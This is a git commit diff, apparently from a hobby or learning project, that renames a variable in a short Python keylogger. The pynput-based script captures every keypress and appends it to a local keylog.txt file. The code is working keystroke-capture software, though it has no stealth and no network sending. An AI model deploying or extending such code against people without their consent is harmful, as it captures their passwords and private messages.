684cead4b6f716be73d1c5e942c871c3a4099ed3
Jawad <jawadakbar5749@gmail.com>
2024-10-20 09:56:22 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -4,12 +4,12 @@ from pynput import keyboard
 
 log_file = "keylog.txt"
 
-def keystrokes(skey):
+def keystrokes(key):
     with open(log_file, "a") as file:
         try:
-            file.write(f"{skey.char}")
+            file.write(f"{key.char}")
         except:
-            file.write(f" {skey} ")
+            file.write(f" {key} ")
 
 with keyboard.Listener(on_press=keystrokes) as listener:
     listener.join()
